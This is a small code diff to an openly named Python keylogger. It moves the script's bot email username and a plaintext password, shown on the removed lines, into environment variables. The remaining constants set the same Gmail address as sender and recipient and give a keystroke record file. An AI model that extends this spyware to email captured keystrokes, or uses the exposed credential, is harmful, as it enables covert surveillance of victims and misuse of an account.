@@ -7,6 +7,7 @@ import datetime
 import pause
 import logger
 import threading
+import os
 from email import encoders
 from email.mime.base import MIMEBase
 from email.mime.text import MIMEText
@@ -17,8 +18,8 @@ FRM_ADDRESS = "keylogger.0w0@gmail.com"
 TO_ADDRESS = "keylogger.0w0@gmail.com"
 
 # Bot email account info
-USR_NAME = "keylogger.0w0"
-FRM_PSWD = "DGisonline13"
+USR_NAME = os.environ['E_NAME']
+FRM_PSWD = os.environ['E_PSWD']
 
 # Path to record.txt
 REC_PATH = "record.txt"
